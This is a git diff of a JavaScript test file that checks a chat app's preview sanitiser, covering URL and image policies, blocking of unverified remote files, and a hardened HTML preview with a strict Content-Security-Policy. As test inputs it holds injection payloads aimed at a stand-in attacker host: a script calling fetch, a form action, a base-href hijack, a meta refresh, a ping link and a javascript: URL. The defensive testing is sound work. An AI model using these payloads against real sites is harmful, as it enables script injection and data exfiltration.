@@ -1,5 +1,7 @@
 import test from "node:test";
 import assert from "node:assert/strict";
+import { createElement } from "react";
+import { renderToStaticMarkup } from "react-dom/server";
 
 import {
   artifactDialogItemFromToolPreview,
@@ -11,7 +13,9 @@ import {
   hasCanvasItems,
   hardenedHtmlPreviewDocument,
   isCanvasPreviewItemRenderable,
-  safePreviewHref,
+  MAX_INLINE_PREVIEW_IMAGE_URL_LENGTH,
+  remotePreviewText,
+  RemotePreviewBoundary,
   safePreviewImageUrl,
   MEMO_PREVIEW_ID,
   selectCanvasTab,
@@ -156,31 +160,67 @@ test("tool preview artifacts map to reusable foreground dialog items", () => {
   assert.equal(image.kind, "image");
   assert.equal(image.imageUrl, "data:image/png;base64,abc");
   assert.equal(image.href, undefined);
+  assert.equal(image.untrustedSourceUrl, undefined);
   assert.equal(file.kind, "file");
   assert.equal(file.title, "a.txt");
 });
 
 
-test("tool preview URL policy blocks external and active-content destinations", () => {
-  const base = "https://rumi.example/chat";
-  assert.equal(safePreviewHref("/artifact/1", base), "https://rumi.example/artifact/1");
-  assert.equal(safePreviewHref("https://attacker.example/track", base), undefined);
-  assert.equal(safePreviewHref("javascript:alert(1)", base), undefined);
-  assert.equal(safePreviewHref("file:///tmp/secret", base), undefined);
-});
-
 test("tool preview image policy permits raster data only and rejects SVG", () => {
   assert.equal(safePreviewImageUrl("data:image/png;base64,abc", "https://rumi.example/"), "data:image/png;base64,abc");
   assert.equal(safePreviewImageUrl("data:image/svg+xml;base64,PHN2Zz4=", "https://rumi.example/"), undefined);
+  assert.equal(safePreviewImageUrl("/artifact/1", "https://rumi.example/"), undefined);
   assert.equal(safePreviewImageUrl("https://attacker.example/pixel.gif", "https://rumi.example/"), undefined);
+  assert.equal(
+    safePreviewImageUrl(`data:image/png;base64,${"a".repeat(MAX_INLINE_PREVIEW_IMAGE_URL_LENGTH)}`),
+    undefined,
+  );
+});
+
+test("remote file URLs stay inert until the host provides verified artifact content", () => {
+  const remote = remotePreviewText({
+    type: "file",
+    filename: "report.html",
+    size: "tool artifact",
+    url: "https://tool.example/report.html",
+  });
+  const inline = remotePreviewText({
+    type: "file",
+    filename: "report.html",
+    size: "inline artifact",
+    url: "https://attacker.example/report.html",
+    content: "<p>inline content</p>",
+  });
+
+  assert.equal(remote.isLoading, false);
+  assert.match(remote.error ?? "", /unverified tool URLs are not fetched/);
+  assert.equal(remote.text, "");
+  assert.equal(inline.error, null);
+  assert.equal(inline.text, "<p>inline content</p>");
+});
+
+test("blocked remote previews expose source copy without a network-bearing element", () => {
+  const html = renderToStaticMarkup(createElement(RemotePreviewBoundary, {
+    url: "https://attacker.example/side-effect",
+    title: "Untrusted preview",
+  }));
+
+  assert.match(html, /Remote preview blocked/);
+  assert.match(html, /URL をコピー/);
+  assert.doesNotMatch(html, /\s(?:src|href)=/);
+  assert.doesNotMatch(html, /<(?:iframe|img|a)\b/);
 });
 
 test("HTML preview document has a fail-closed CSP and no injected base URL", () => {
-  const document = hardenedHtmlPreviewDocument("<script>fetch('https://attacker.example')</script><form action='https://attacker.example'><button>go</button></form>");
+  const document = hardenedHtmlPreviewDocument("<head><base href='https://attacker.example'><meta content='0;url=https://attacker.example' http-equiv='refresh'></head><body><a href='https://attacker.example' ping='https://attacker.example/ping'>leave</a><area href='https://attacker.example/map'><script>fetch('https://attacker.example')</script><form action='https://attacker.example'><button>go</button></form></body>");
   assert.match(document, /Content-Security-Policy/);
   assert.match(document, /default-src 'none'/);
   assert.match(document, /connect-src 'none'/);
   assert.match(document, /form-action 'none'/);
   assert.match(document, /base-uri 'none'/);
+  assert.match(document, /navigate-to 'none'/);
   assert.doesNotMatch(document, /<base\s/i);
+  assert.doesNotMatch(document, /http-equiv=['"]refresh/i);
+  assert.doesNotMatch(document, /<(?:a|area)\b/i);
+  assert.match(document, /<span>leave<\/span>/);
 });
